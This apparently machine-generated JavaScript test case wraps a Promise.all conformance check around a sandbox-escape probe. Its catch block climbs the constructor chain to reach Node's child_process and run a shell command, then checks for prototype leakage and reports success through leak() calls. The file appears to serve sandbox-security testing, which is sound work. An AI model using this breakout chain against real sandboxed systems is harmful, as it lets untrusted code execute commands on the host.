try {
    var p1 = Promise.resolve(3);
    var pAll = Promise.all([p1]);
    pAll.then(function (result) {
        throw () => {
            return () => {
            };
        };
        if (!(pAll instanceof Promise)) {
            $ERROR('Expected Promise.all() to be promise, actually ' + pAll);
        }
        if (!(result instanceof Array)) {
            $ERROR('Expected Promise.all() to be promise for an Array, actually ' + result);
        }
        if (result.length !== 1) {
            $ERROR('Expected Promise.all([p1]) to be a promise for one-element Array, actually ' + result);
        }
        if (result[0] !== 3) {
            $ERROR('Expected result[0] to be 3, actually ' + result[0]);
        }
    }).then($DONE, $DONE);
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}